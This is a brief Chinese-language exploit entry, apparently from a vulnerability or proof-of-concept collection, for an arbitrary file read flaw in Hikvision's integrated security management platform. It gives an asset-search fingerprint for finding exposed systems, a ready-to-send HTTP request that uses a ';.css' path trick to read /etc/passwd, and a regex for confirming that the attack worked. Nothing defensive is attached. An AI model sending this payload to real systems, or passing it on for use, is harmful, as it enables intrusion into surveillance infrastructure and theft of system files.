# HIKVISION综合安防管理平台files任意文件读取

海康 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="HIKVISION-综合安防管理平台"`
- **请求**：`GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$